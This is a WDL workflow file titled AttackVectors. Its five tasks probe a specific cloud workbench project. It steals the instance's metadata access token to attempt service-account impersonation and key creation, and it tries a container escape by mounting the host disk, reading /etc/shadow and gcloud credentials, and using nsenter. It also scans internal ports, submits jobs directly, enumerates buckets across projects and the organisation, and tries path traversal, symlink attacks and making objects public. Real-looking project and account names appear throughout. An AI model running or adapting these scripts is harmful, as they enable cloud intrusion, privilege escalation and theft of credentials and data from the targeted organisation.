version 1.0

workflow AttackVectors {
    call SAImpersonation
    call DockerEscape
    call CromwellAPI
    call CrossWorkspace
    call GCSTraversal
}

task SAImpersonation {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR 1: SA IMPERSONATION" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        # Our SA
        echo "=== Current SA ===" >> results.txt
        SA_SELF=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")
        echo "$SA_SELF" >> results.txt
        echo "" >> results.txt

        # Owner's SA
        OWNER_SA="pet-2778175469911ac304b8a@wb-chipper-diamond-3014.iam.gserviceaccount.com"
        echo "=== Target (Owner SA): $OWNER_SA ===" >> results.txt
        echo "" >> results.txt

        # Try impersonation via gcloud
        echo "=== Impersonate via gcloud ===" >> results.txt
        gcloud auth print-access-token --impersonate-service-account="$OWNER_SA" 2>&1 >> results.txt
        echo "" >> results.txt

        # Try via IAM API directly
        echo "=== Impersonate via IAM API (generateAccessToken) ===" >> results.txt
        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)

        curl -s -X POST \
          "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${OWNER_SA}:generateAccessToken" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' \
          2>&1 >> results.txt
        echo "" >> results.txt

        # Try generateIdToken
        echo "=== Impersonate via generateIdToken ===" >> results.txt
        curl -s -X POST \
          "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${OWNER_SA}:generateIdToken" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"audience":"https://workbench.verily.com","includeEmail":true}' \
          2>&1 >> results.txt
        echo "" >> results.txt

        # Try signBlob
        echo "=== Impersonate via signBlob ===" >> results.txt
        curl -s -X POST \
          "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${OWNER_SA}:signBlob" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"payload":"dGVzdA=="}' \
          2>&1 >> results.txt
        echo "" >> results.txt

        # Check IAM permissions on Owner's SA
        echo "=== Test IAM permissions on Owner SA ===" >> results.txt
        curl -s -X POST \
          "https://iam.googleapis.com/v1/projects/wb-chipper-diamond-3014/serviceAccounts/${OWNER_SA}:testIamPermissions" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{
            "permissions": [
              "iam.serviceAccounts.actAs",
              "iam.serviceAccounts.getAccessToken",
              "iam.serviceAccounts.getOpenIdToken",
              "iam.serviceAccounts.implicitDelegation",
              "iam.serviceAccounts.signBlob",
              "iam.serviceAccounts.signJwt",
              "iam.serviceAccounts.get",
              "iam.serviceAccounts.list",
              "iam.serviceAccounts.delete",
              "iam.serviceAccounts.update",
              "iam.serviceAccountKeys.create",
              "iam.serviceAccountKeys.get",
              "iam.serviceAccountKeys.list"
            ]
          }' 2>&1 >> results.txt
        echo "" >> results.txt

        # Try to create a key for Owner's SA
        echo "=== Create key for Owner SA ===" >> results.txt
        curl -s -X POST \
          "https://iam.googleapis.com/v1/projects/wb-chipper-diamond-3014/serviceAccounts/${OWNER_SA}/keys" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"privateKeyType":"TYPE_GOOGLE_CREDENTIALS_FILE"}' \
          2>&1 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}

task DockerEscape {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR 2: DOCKER ESCAPE" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        # Check capabilities
        echo "=== Capabilities ===" >> results.txt
        cat /proc/self/status | grep -i cap >> results.txt 2>&1
        echo "" >> results.txt

        # Decode capabilities
        echo "=== Decoded Caps ===" >> results.txt
        CAPEFF=$(cat /proc/self/status | grep CapEff | awk '{print $2}')
        echo "CapEff raw: $CAPEFF" >> results.txt
        # Check if privileged (all caps = 0000003fffffffff or higher)
        echo "" >> results.txt

        # Docker socket
        echo "=== Docker Socket ===" >> results.txt
        ls -la /var/run/docker.sock 2>&1 >> results.txt
        ls -la /run/docker.sock 2>&1 >> results.txt
        echo "" >> results.txt

        # Try docker commands if socket exists
        echo "=== Docker Info ===" >> results.txt
        if [ -S /var/run/docker.sock ]; then
            curl -s --unix-socket /var/run/docker.sock http://localhost/info 2>&1 | head -100 >> results.txt
            echo "" >> results.txt
            echo "=== Docker Containers ===" >> results.txt
            curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>&1 | head -100 >> results.txt
        else
            echo "No docker socket found" >> results.txt
        fi
        echo "" >> results.txt

        # Check if we're in privileged mode
        echo "=== Privileged Check ===" >> results.txt
        if [ -d /dev/sda ]; then
            echo "Block devices accessible" >> results.txt
        fi
        ls -la /dev/sd* 2>&1 >> results.txt
        fdisk -l 2>&1 | head -20 >> results.txt
        echo "" >> results.txt

        # Check cgroup escape
        echo "=== Cgroup ===" >> results.txt
        cat /proc/1/cgroup 2>&1 >> results.txt
        echo "" >> results.txt

        # Host PID namespace check
        echo "=== /proc/1/cmdline (host PID?) ===" >> results.txt
        cat /proc/1/cmdline 2>&1 | tr '\0' ' ' >> results.txt
        echo "" >> results.txt

        # Check mounted host paths
        echo "=== Host Mounts ===" >> results.txt
        mount | grep -E "(sda|sdb|host|docker)" >> results.txt 2>&1
        echo "" >> results.txt

        # Try to access host filesystem via /dev/sda1
        echo "=== Host FS via /dev/sda1 ===" >> results.txt
        mkdir -p /tmp/hostfs 2>/dev/null
        mount /dev/sda1 /tmp/hostfs 2>&1 >> results.txt
        if [ -d /tmp/hostfs/etc ]; then
            echo "HOST FS MOUNTED!" >> results.txt
            ls -la /tmp/hostfs/etc/ 2>&1 | head -20 >> results.txt
            cat /tmp/hostfs/etc/shadow 2>&1 | head -5 >> results.txt
            echo "" >> results.txt
            # Host docker config
            echo "=== Host Docker Config ===" >> results.txt
            cat /tmp/hostfs/etc/docker/daemon.json 2>&1 >> results.txt
            echo "" >> results.txt
            # Host SA keys
            echo "=== Host SA Keys ===" >> results.txt
            find /tmp/hostfs -name "*.json" -path "*/gcloud/*" 2>/dev/null | head -10 >> results.txt
            ls -la /tmp/hostfs/root/.config/gcloud/ 2>&1 >> results.txt
            echo "" >> results.txt
            # Batch agent logs
            echo "=== Batch Agent ===" >> results.txt
            ls -la /tmp/hostfs/usr/bin/cloud-batch-agent 2>&1 >> results.txt
            cat /tmp/hostfs/etc/systemd/system/cloud-batch-agent.service 2>&1 >> results.txt
            umount /tmp/hostfs 2>/dev/null
        else
            echo "Could not mount host FS" >> results.txt
        fi
        echo "" >> results.txt

        # Try nsenter
        echo "=== nsenter to host ===" >> results.txt
        nsenter --target 1 --mount --uts --ipc --net --pid -- id 2>&1 >> results.txt
        echo "" >> results.txt

        # seccomp profile
        echo "=== Seccomp ===" >> results.txt
        grep -i seccomp /proc/self/status 2>&1 >> results.txt
        echo "" >> results.txt

        # AppArmor
        echo "=== AppArmor ===" >> results.txt
        cat /proc/self/attr/current 2>&1 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}

task CromwellAPI {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR 3: CROMWELL API ACCESS" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        # Scan common Cromwell ports
        echo "=== Cromwell Port Scan ===" >> results.txt
        for port in 8000 8080 8443 443 80 3000 5000 9000; do
            code=$(curl -s -o /tmp/crom_resp.txt -w "%{http_code}" --max-time 3 "http://localhost:${port}/" 2>/dev/null)
            if [ "$code" != "000" ]; then
                echo "[${code}] localhost:${port}" >> results.txt
                head -5 /tmp/crom_resp.txt >> results.txt
                echo "" >> results.txt
            fi
        done
        echo "" >> results.txt

        # Try host IP gateway
        GATEWAY=$(ip route | grep default | awk '{print $3}')
        echo "=== Gateway: $GATEWAY ===" >> results.txt
        for port in 8000 8080 443 80; do
            code=$(curl -s -o /tmp/gw_resp.txt -w "%{http_code}" --max-time 3 "http://${GATEWAY}:${port}/" 2>/dev/null)
            if [ "$code" != "000" ]; then
                echo "[${code}] ${GATEWAY}:${port}" >> results.txt
                head -5 /tmp/gw_resp.txt >> results.txt
                echo "" >> results.txt
            fi
        done
        echo "" >> results.txt

        # Host machine IP (10.128.0.x)
        HOST_IP=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip")
        echo "=== Host IP: $HOST_IP ===" >> results.txt
        for port in 8000 8080 8443 443 80 2375 2376; do
            code=$(curl -s -o /tmp/host_resp.txt -w "%{http_code}" --max-time 3 "http://${HOST_IP}:${port}/" 2>/dev/null)
            if [ "$code" != "000" ]; then
                echo "[${code}] ${HOST_IP}:${port}" >> results.txt
                head -5 /tmp/host_resp.txt >> results.txt
                echo "" >> results.txt
            fi
        done
        echo "" >> results.txt

        # Try Cromwell at workbench API
        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)

        echo "=== Cromwell via Workbench API ===" >> results.txt
        # List workflows
        curl -s --max-time 10 \
          "https://workbench.verily.com/api/axon/api/batch/v1/pipelines" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -50 >> results.txt
        echo "" >> results.txt

        # Batch API - list jobs directly
        echo "=== Google Batch API ===" >> results.txt
        curl -s --max-time 10 \
          "https://batch.googleapis.com/v1/projects/wb-chipper-diamond-3014/locations/us-central1/jobs" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -100 >> results.txt
        echo "" >> results.txt

        # Try to submit a new batch job directly (without Cromwell)
        echo "=== Direct Batch Job Submit Test ===" >> results.txt
        curl -s -X POST --max-time 10 \
          "https://batch.googleapis.com/v1/projects/wb-chipper-diamond-3014/locations/us-central1/jobs?job_id=test-direct-batch" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{
            "taskGroups": [{
              "taskSpec": {
                "runnables": [{
                  "container": {
                    "imageUri": "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine",
                    "commands": ["/bin/bash", "-c", "echo direct-batch-exec > /dev/null"]
                  }
                }]
              },
              "taskCount": "1"
            }],
            "logsPolicy": {"destination": "CLOUD_LOGGING"}
          }' 2>&1 | head -30 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}

task CrossWorkspace {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR 4: CROSS-WORKSPACE ACCESS" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)

        # Try common wb-* bucket patterns
        echo "=== Brute-force wb-* buckets ===" >> results.txt
        for name in \
          "wb-chipper-diamond-3014" \
          "storage-transfer-wb-chipper-diamond-3014" \
          "cromwell-workflow-wb-chipper-diamond-3014" \
          "dataproc-staging-wb-chipper-diamond-3014" \
          "dataproc-temp-wb-chipper-diamond-3014"; do
            echo "--- gs://$name/ ---" >> results.txt
            gcloud storage ls "gs://$name/" 2>&1 | head -10 >> results.txt
            echo "" >> results.txt
        done

        # Try to list all accessible buckets via API
        echo "=== Storage API - all accessible buckets ===" >> results.txt
        curl -s \
          "https://storage.googleapis.com/storage/v1/b?project=wb-chipper-diamond-3014" \
          -H "Authorization: Bearer $TOKEN" 2>&1 >> results.txt
        echo "" >> results.txt

        # Try Verily's main project buckets
        echo "=== Cross-project bucket access ===" >> results.txt
        curl -s \
          "https://storage.googleapis.com/storage/v1/b?project=prj-p-1v-s0i" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -20 >> results.txt
        echo "" >> results.txt

        # Try to access other Verily services via their API
        echo "=== Verily Resource Manager API ===" >> results.txt
        curl -s \
          "https://cloudresourcemanager.googleapis.com/v1/projects?filter=parent.type%3Aorganization" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -30 >> results.txt
        echo "" >> results.txt

        # Try to list all projects in org
        echo "=== All Projects (org-wide) ===" >> results.txt
        curl -s \
          "https://cloudresourcemanager.googleapis.com/v1/projects" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -50 >> results.txt
        echo "" >> results.txt

        # Container Registry - look for other images
        echo "=== Container Registry ===" >> results.txt
        curl -s \
          "https://gcr.io/v2/wb-chipper-diamond-3014/tags/list" \
          -H "Authorization: Bearer $TOKEN" 2>&1 >> results.txt
        echo "" >> results.txt

        # Artifact Registry
        echo "=== Artifact Registry ===" >> results.txt
        gcloud artifacts repositories list 2>&1 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}

task GCSTraversal {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR 5: GCS PATH TRAVERSAL" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)

        # Try writing outside workflow directory
        echo "=== Write to bucket root ===" >> results.txt
        echo "traversal-test-$(date +%s)" | gcloud storage cp - "gs://writer-abuse-bkt/TRAVERSAL_TEST" 2>&1 >> results.txt
        echo "" >> results.txt

        # Try path traversal in object name
        echo "=== Path traversal ../  ===" >> results.txt
        echo "traversal" | gcloud storage cp - "gs://writer-abuse-bkt/../../../etc/passwd" 2>&1 >> results.txt
        echo "" >> results.txt

        # Write to mounted GCS via filesystem
        echo "=== GCS via FUSE mount ===" >> results.txt
        ls -la /mnt/disks/gcs/ 2>&1 | head -20 >> results.txt
        echo "" >> results.txt

        # Can we access ALL files in the bucket via mount?
        echo "=== All bucket files via mount ===" >> results.txt
        find /mnt/disks/gcs/ -maxdepth 2 -type f 2>&1 | head -30 >> results.txt
        echo "" >> results.txt

        # Read SSRF-exfiltrated files from mount
        echo "=== Read envoy-config-dump via mount ===" >> results.txt
        head -20 /mnt/disks/gcs/envoy-config-dump 2>&1 >> results.txt
        echo "" >> results.txt

        # Try to write a symlink that points to host filesystem
        echo "=== Symlink attack ===" >> results.txt
        ln -s /etc/passwd /mnt/disks/gcs/symlink-test 2>&1 >> results.txt
        ln -s /root/.config/gcloud /mnt/disks/gcs/symlink-gcloud 2>&1 >> results.txt
        echo "" >> results.txt

        # Check bucket IAM
        echo "=== Bucket IAM Policy ===" >> results.txt
        curl -s \
          "https://storage.googleapis.com/storage/v1/b/writer-abuse-bkt/iam" \
          -H "Authorization: Bearer $TOKEN" 2>&1 >> results.txt
        echo "" >> results.txt

        # Check if we can modify bucket settings
        echo "=== Bucket metadata ===" >> results.txt
        curl -s \
          "https://storage.googleapis.com/storage/v1/b/writer-abuse-bkt" \
          -H "Authorization: Bearer $TOKEN" 2>&1 >> results.txt
        echo "" >> results.txt

        # Try making bucket public
        echo "=== Make object public (test) ===" >> results.txt
        curl -s -X PUT \
          "https://storage.googleapis.com/storage/v1/b/writer-abuse-bkt/o/TRAVERSAL_TEST/acl/allUsers" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"entity":"allUsers","role":"READER"}' 2>&1 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}
